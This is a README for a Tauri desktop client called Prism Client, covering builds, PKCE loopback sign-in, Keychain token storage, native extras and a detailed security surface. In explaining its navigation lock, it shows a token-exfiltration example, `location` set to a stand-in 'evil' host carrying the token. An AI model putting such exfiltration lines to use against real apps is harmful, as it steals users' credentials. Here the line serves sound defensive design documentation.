# Prism Client (`apps/client`)

A thin Tauri 2 app that bundles the **native build of `apps/web`** and talks to exactly
one **Prism Server** with a revocable **device token**. It is the laptop client of
Architecture v2 (WP4.1) and the shell the iPhone app joins in WP5.

It holds **no vault token**, runs **no ingest**, spawns **no CLI**, and has **no fs/shell
access**. Everything it can see or change goes through the server gateway, so
`effectiveLevel`/governance apply exactly as they do in a browser.

| | Legacy desktop (`apps/desktop`) | Prism Client (`apps/client`) |
|---|---|---|
| Trust model | Holds the vault JWT, talks to `localhost:1940` | Holds a per-device `pd_…` token, talks to one Prism Server |
| Backend | ~100 Rust commands, sync services, `claude`/`gog`/`gh` subprocesses | 6 commands: `get_token`, `sign_in`, `sign_out`, `get_server_origin`, `set_server_origin`, `open_external` |
| UI | Desktop build of `@prism/core` | `apps/web` built with `--mode native` |
| Identity | `Prism`, `com.benjaminlife.prism` | **`Prism Client`**, `com.benjaminlife.prism.client` |
| Agent / ingest | Local | Server-side (`/api/agent/*`, server workers) |

**Why "Prism Client".** During the transition both apps are installed. The bundle name
comes from the product name, so a second `Prism.app` would overwrite the legacy one in
`/Applications`. A distinct name and identifier keep them side by side, with separate
keychain items and settings. WP4.3 (retire host-mode desktop) can rename it to "Prism".

## Build and run

```bash
npm install --prefer-offline                   # at the repo root
cd apps/client
npm run tauri build -- --bundles app           # -> <target>/release/bundle/macos/Prism Client.app
npm run tauri dev                              # same bundle, debug build, devtools on
cd src-tauri && cargo test                     # PKCE, loopback, origin/CSP, token exchange (local fakes)
node apps/client/scripts/verify-client.mjs     # static invariants (CSP, capabilities, bundle); --build to rebuild web first
```

Both `tauri build` and `tauri dev` first run `npm run build:native -w @prism/web`
(→ `apps/web/dist-native`). There is no dev server: dev serves the same bundled build,
so no `localhost` origin is ever needed. Rebuild after web changes.

### Server origin

The client talks to one origin, chosen in this order:

1. **Prism → Server Settings…** (Cmd-,): saved in
   `~/Library/Application Support/com.benjaminlife.prism.client/client-settings.json`. Saving
   restarts the app, because the CSP is built from the origin at startup.
2. `PRISM_SERVER_ORIGIN` at **build time**, e.g.
   `PRISM_SERVER_ORIGIN=https://prism.example.com npm run tauri build -- --bundles app`.
3. The default, `https://prism.omniharmonic.com`.

Accepted: `https://host[:port]`; `http://` only for `127.0.0.1`/`localhost`/`[::1]` (a local
test server). Ports 1939/1940 (hub/vault) are refused: the client never talks to a vault.
No path, query, fragment or userinfo.

The Server Settings dialog is page UI, so page script could alter what it submits. Two
gates stand behind it:

1. A **single-use grant**. The shell mints it only when the user picks the native menu
   item. It is valid for 10 minutes and is consumed by any save attempt, right or wrong.
2. A **native confirmation**, which is the real boundary. It shows the normalized origin
   that will actually be saved ("Point Prism Client at https://…? You will need to sign
   in…", with Cancel as the default button).

Only the dialog's **Change Server** button persists. Cancel or closing it saves nothing and
still consumes the grant.

The same file stores the main window's size/position/maximized state. It never holds a
token.

## Sign-in (PKCE + loopback redirect)

The server side is documented in [native-auth.md](native-auth.md). The client leg:

1. The web app shows **Sign in to Prism** (`NativeSignInScreen`) when it has no token or
   gets a 401. The button calls `__PRISM_HOST__.signIn()` → `sign_in` command.
2. Rust generates a fresh PKCE verifier (32 random bytes, base64url), its S256 challenge and a
   random `state`, and binds **`127.0.0.1:<random port>`** (RFC 8252 §7.3).
3. The **system browser** opens
   `/auth/device/authorize?client_id=prism-native&redirect_uri=http://127.0.0.1:<port>/callback&code_challenge=…&code_challenge_method=S256&state=…&label=Prism Client on <host>`.
   The user signs in with the normal web login (password or owner magic link) and approves.
4. Each local connection is served in its own task: at most 8 at once, extras dropped,
   2 s to send the request. An idle or slow local socket therefore can't stall sign-in.
   The listener accepts exactly **one** `GET /callback` carrying our `state` (constant-time
   compare), answers with a static page, and closes. Wrong paths get 404, and forged or
   stale `state` gets 400. Neither ends the wait, so a local process can't cancel a real
   sign-in. The whole wait times out after 10 minutes. Pressing Sign in again cancels the
   previous attempt.
5. Rust POSTs `grant_type=authorization_code, code, code_verifier, redirect_uri,
   client_id` to `/auth/device/token`. Redirects are refused, and the response must be a
   `Bearer` `pd_…` token.
6. The token is stored in the **Keychain**, the window is focused, and the page reloads. The
   auth gate then calls `/auth/me` with the bearer.

The verifier and code never enter the webview. Only the resulting token does, through
`getToken()`, because the page's `fetch` needs it.

**Why loopback rather than `prism://`.** A custom scheme can be claimed by any app on the
machine. A loopback port is bound by us for the duration of one attempt. This is the RFC
8252 recommendation for desktop apps, and it needs no deep-link plugin or `Info.plist`
URL-type registration. The server allowlist already accepts it (`DEVICE_ALLOW_LOOPBACK`,
default on). iOS (WP5.2) uses `ASWebAuthenticationSession` with `prism://auth/callback`
or a universal link. It plugs into the `#[cfg(mobile)]` arm of `signin.rs` and reuses
`pkce.rs`, `auth.rs` and `secure_store.rs` unchanged.

### Sign-out and 401

- **Account → Sign out** (web `logout()`): revokes with the bearer, then
  `onSignedOut()` → `sign_out {revoke:false}` deletes the keychain item.
- **Prism → Sign Out** (menu): `sign_out {revoke:true}` works in this order:
  1. It revokes (`POST /auth/device/revoke token=…`) with whatever token it knows, from
     memory or else from the keychain.
  2. It then forgets the token: first in memory, then in the keychain. A keychain failure
     can therefore never skip the revoke, and it is reported to the UI as a toast.
  3. It deletes the offline read cache (`prism-read-cache`) and reloads.
- **401** on our token: `onUnauthorized()` → `sign_out {revoke:false}` (the token is dead
  anyway). The app shows the sign-in screen. It never auto-opens the browser.

## Keychain

`secure_store.rs` calls Security.framework's `SecItem*` API via the `security-framework`
crate, the same code on macOS and iOS. It stores one generic-password item per server:

- service `com.benjaminlife.prism.client`
- account = the origin
- label "Prism device token"
- **non-synchronizable** (never iCloud Keychain)

Setting deletes and re-adds the item, so its ACL binds to the current binary. The token is
read from the keychain once per process and then served from memory, because `getToken()`
runs on every request. On platforms without a binding the store refuses to save, and the
app stays signed out. It never falls back to a file or `localStorage`.

Unsigned or ad-hoc-signed dev builds: macOS ties the item's ACL to the binary's code
signature, so after a rebuild the first read may show an "allow access" prompt. Signed
release builds don't.

## Host hook

`src-tauri/src/host.js` is injected as an initialization script, before the app bundle.
The origin is JSON-injected by `host.rs`. It defines a frozen `window.__PRISM_HOST__` with
`apiOrigin`, `getToken`, `onUnauthorized`, `signIn` and `onSignedOut` (the WP2.2
contract). It also defines `window.__PRISM_SHELL__` (`showServerSettings(grant)`,
`signOut()`, `toast()`), which the native menu drives. It uses Tauri's
`__TAURI_INTERNALS__.invoke`, captured at startup. `withGlobalTauri` is off, and the web
build aliases `@tauri-apps/api/core` to its own shim.

Because the host hook is present, `@prism/core`'s `isDesktop` is **false** in the client
(`lib/platform.ts`). Desktop-only affordances such as Google Calendar writes stay hidden,
just as in the PWA.

## Native extras (WP4.2, desktop only)

Five extras. None changes the navigation lock, the CSP, the origin-change confirmation or
how the token is handled. Each is least-privilege; the command table is the whole new IPC
surface.

| Extra | Command | Window / capability file | Notes |
|---|---|---|---|
| Quick capture | `quick_capture {text}` | `quick-capture` window only, `capabilities/quick-capture.json` (grants `allow-quick-capture` and nothing else) | POSTs from Rust. The window never gets `get_token`. |
| Notifications | `notify {title, body, sessionId?}` | `main`, `capabilities/default.json` | Shown only while the main window is NOT focused. |
| Export | `export_note {content, suggestedName, format}` | `main`, `capabilities/default.json` | Destination comes from the native save panel only. |
| Tray / global shortcut | none (Rust only) | none | No page-callable surface at all. |
| Drag-drop | none (OS event, Rust only) | none | Content reaches the page as a DOM event. |

**Menu-bar icon (tray).** Items: Quick capture…, Open Prism, Sign out, Quit Prism. Sign out
runs the same path as the app menu (`signOut()` in `host.js`). Closing the main window now
**hides** it, so the app stays in the menu bar; Cmd-Q or tray Quit exits, and a dock click
or "Open Prism" shows the window again. The tray uses the app icon (a monochrome template
icon is a polish item).

**Quick capture** (tray item, File menu, global shortcut). A small always-on-top window
that loads the static `quick-capture.html` from the bundle (apps/web/public). It has no app
code, no host hook and no token. Its only call is `quick_capture {text}`:
- Rust validates the text (non-empty, ≤100,000 bytes, no control characters except
  `\n \r \t`), builds the request itself (`capture.rs`: one fixed destination, `POST
  <configured origin>/api/notes`, path `vault/capture/<utc-date>/<HHMMSS>-<rand4>`, tag
  `capture`, metadata `source`/`capturedAt`) and sends it with the stored device token. It
  doesn't follow redirects, and no error message echoes a response body.
- The page controls only the text. An empty text means "dismiss" (Esc/Cancel): the window
  closes and nothing is sent. A signed-out client returns "You're signed out…".
- It writes to the server's primary vault (the shell has no vault switcher). The note
  appears in the app via the normal invalidation stream.

**Global shortcut.** Default `CommandOrControl+Shift+Space`. Configure it in
`client-settings.json` as `"quickCaptureShortcut"`: absent = default, `""` = off. It must
include a modifier; an invalid or already-taken value is logged and ignored (the tray
still works). Restart required. It is registered from Rust with the official
`tauri-plugin-global-shortcut`; none of its commands is granted to any window, so page
script can't register or observe global shortcuts.

**Notifications.** The web layer wraps the agent client's stream (`native/notifyTurnEnd.ts`);
the terminal `status` event of a turn (`done`, `error`, `interrupted`) calls
`__PRISM_SHELL__.notify(...)` with generic text and the session id (no reply text).
Rust (`notify.rs`) treats everything as untrusted display text: HTML tags and angle
brackets are removed, control/bidi characters collapsed, title ≤80 and body ≤240 characters,
session id must match `[A-Za-z0-9_-]{8,64}`; shown only if the main window is unfocused or
hidden, and at most one per 1.5 s. Clicking a notification activates the app; notify-rust
has no click callback on desktop, so the shell remembers the session id for 60 s and, when
the main window next gains focus within that time, dispatches the in-app DOM event
`prism:open-agent-session` (the same event the push deep link uses: no navigation). A
focus change within 60 s of a notification therefore also opens that session. Background
notifications for a closed app need APNs (WP5).
`tauri-plugin-notification`/`-dialog` are deliberately not used: they inject JS shims
(`window.Notification`, `alert`, `confirm`) into every webview. The shell calls their
underlying libraries (`notify-rust`, `rfd`) from Rust, so there is no JS-reachable plugin
surface. `verify-client.mjs` fails if either plugin is added.

**Export.** File → Export Note as Markdown… (Cmd-Shift-E) / as HTML…. The menu fires
`prism:export-note`; the page builds the content from the open note (turndown/marked,
`native/extras.ts`) and calls `export_note`. Rust shows the native save panel, with a
name sanitised by `export.rs` (no separators, reserved characters, leading dots, ≤80
characters), and writes **only** to the path the panel returns (extension added if the user
left it off; a folder is refused). The command has no path parameter (a unit test and
`verify-client.mjs`-style checks keep it that way), and no fs permission exists for JS. HTML
exports are wrapped in a standalone document whose CSP forbids script, so a note carrying
markup can't run code when the file is opened. Content cap 20 MB. It returns only the file
name.

**Drag-drop.** Files dropped on the main window arrive as the OS drop event in Rust
(`dropfiles.rs`). `.md/.markdown/.txt` up to 1 MiB each, 10 files and 4 MiB per drop, valid
UTF-8, regular files only, are read; everything else is reported as "Attachments aren't
supported yet." (binaries are never read or uploaded in this WP). The shell then delivers
the CONTENT to the page as `prism:files-dropped`, and the page creates the notes through
its normal gateway client (`native/extras.ts`: path `vault/imports/<date>/<slug>-<rand>`, tag
`document`; `.md` rendered to HTML for the editor), then opens the first one.
*Why not create them from Rust?* That would be a second note writer holding the bearer
that ignores the active vault, the offline outbox and invalidation; and the page already
has write authority through its own token path, so routing a user-dropped file's text
through it adds none. The part that must stay in Rust (reading local files) can't be
reached by the page: paths exist only inside the OS event, never as an argument.

**Verified by** the Rust unit tests (`capture`, `notify`, `export`, `dropfiles`,
`shortcut`) and `verify-client.mjs` (each capability file lists exactly its window's
commands; quick-capture never holds `get_token`; the capture page calls only
`quick_capture`; no notification/dialog plugin). Manual checklist:
`apps/client/scripts/verify-client-flow.md` §8.

## Security surface

- **CSP** is built at startup from the origin (`origin.rs` `build_csp`). The copy in
  `tauri.conf.json` is only the build-time placeholder for the default origin.
  - `connect-src 'self' ipc: http://ipc.localhost <origin> <wss-origin>`: the page can
    reach nothing else.
  - `img-src 'self' data: blob: <origin>`.
  - `script-src 'self' 'wasm-unsafe-eval'`.
  - Styles and fonts are the same as the PWA (Google Fonts, esm.sh font files).
  - `style-src` nonce injection is disabled (`dangerousDisableAssetCspModification:
    ["style-src"]`) so that `'unsafe-inline'` keeps working for editor libraries that
    inject `<style>`.
- **Capabilities** (`capabilities/default.json`): the `main` window gets (plus, since WP4.2, `allow-notify` and `allow-export-note`; the separate `quick-capture` window gets only `allow-quick-capture`, see Native extras)
  `allow-get-token`, `allow-sign-in`, `allow-sign-out`, `allow-get-server-origin`,
  `allow-set-server-origin` and `allow-open-external`, and nothing else.
  - `build.rs` declares the commands in the app manifest, so anything not granted is denied.
  - There are no `core:*` permissions, and no fs, shell, http or opener permissions for JS.
  - There is no `remote` block: remote pages get no IPC.
- **Navigation** (`window.rs` `navigation_decision`): only the bundled app
  (`tauri://localhost`) and inert `about:` frames load. Every other navigation is cancelled
  silently, with no side effect.
  - This covers the main frame and subframes alike. wry's callback gets only the URL, not
    the frame, so the rule has to be safe for both.
  - A `<meta refresh>` in a website-note iframe goes nowhere, and so does
    `location = "https://evil/?t=…"`. `window.open` is refused the same way
    (`on_new_window` → Deny).
- **Opening links** is a separate, explicit path:
  - The host hook intercepts clicks on external `<a href>` (capture phase) and external
    `window.open(url)` calls, and calls `open_external`.
  - Rust checks the scheme (`http`/`https`/`mailto` only, no userinfo, ≤4096 chars; never a
    bundle, `javascript:`, `file:` or custom-scheme URL).
  - It then shows a **native** `NSAlert` with the URL (`confirm.rs`). Only the user's click
    on **Open** reaches the opener. On non-macOS platforms the dialog answers "no" until
    WP5 adds one.
- **The token is readable by page script, so XSS = token theft.** The WP2.2 contract gives
  `getToken()` to the page, because its `fetch` needs it.
  - The CSP (`connect-src`/`img-src`) limits where the page can *fetch*, but it is **not a
    boundary against navigation**. The shell's navigation lock and the native confirmation
    on `open_external` are what stand in the way of `location = …`/`window.open` exfiltration.
  - Even so, a user who clicks **Open** on a URL carrying the token hands it over. Treat any
    XSS in the web bundle as a full compromise of that device token. It is revocable in
    Account → Signed-in devices, and it dies after 90 idle days.
- **No process spawning** in the shell's code. The opener plugin uses macOS
  LaunchServices (`open`) to show the browser.
- **Verified by** `scripts/verify-client.mjs` and the Rust unit tests.

## Known limits (follow-ups)

- **External images and map tiles are blocked.**
  - `img-src` and `connect-src` allow only the server. This is deliberate: the page can read
    the bearer token, and an arbitrary image URL is a data-exfiltration channel.
  - External images embedded in notes don't render in the client, although they do in the
    PWA.
  - The Map's OpenFreeMap basemap falls back to blank.
  - Candidate fixes (WP4.2): an image/tile proxy on the server, or an opt-in allowlist.
- Password-gated public `/p/:slug` sites need a cookie. Open them in the browser
  (native-auth.md).
- A collab WebSocket that is already open survives revocation until it reconnects (a server
  property).
- `dirs::config_dir()` is used for settings because the CSP must be known before the Tauri
  app exists. On iOS (WP5.1) this must move to the app's sandbox container.
- **L3: keychain hardening.** Blocked on Apple signing (D1). The item currently lives in the
  file-based login keychain with an app-ACL. With a Developer ID/team signature, move it to
  the data-protection keychain (`use_protected_keychain`) with
  `kSecAttrAccessibleWhenUnlockedThisDeviceOnly` (plus a keychain-access-group
  entitlement).
- **L4: bundle the fonts.** Ship Inter/JetBrains Mono/Newsreader/DM Sans and Excalidraw's
  hand-drawn fonts in the native build. That would drop `https://fonts.googleapis.com`,
  `https://fonts.gstatic.com` and `https://esm.sh` from the CSP, leaving the server as the
  only remote origin.

## What WP5 (iOS) adds to this shell

- `tauri ios init` in `apps/client` (it creates `gen/apple`). Add the `iOS` platform to the
  capability; it is already listed.
- **WP5.2 sign-in**: an `ASWebAuthenticationSession` (small Swift plugin, or
  `tauri-plugin-deep-link` + `prism://auth/callback`) in the `#[cfg(mobile)]` arm of
  `signin.rs`, returning the redirect URL to `pkce::parse_callback_query`. Everything after
  that is shared. If the redirect is a universal link, register it in the server's
  `DEVICE_REDIRECT_URIS`.
- **Keychain**: `secure_store.rs` already compiles for iOS. Add
  `kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly` and optional biometric access control
  (Face ID) there.
- **Settings path**: resolve the settings directory from the iOS app container (see
  Known limits). There is no window-geometry or menu code on mobile (`#[cfg(desktop)]`).
- APNs registration (WP5.3) as a separate plugin/command. It must be declared in `build.rs`
  and granted in the capability.
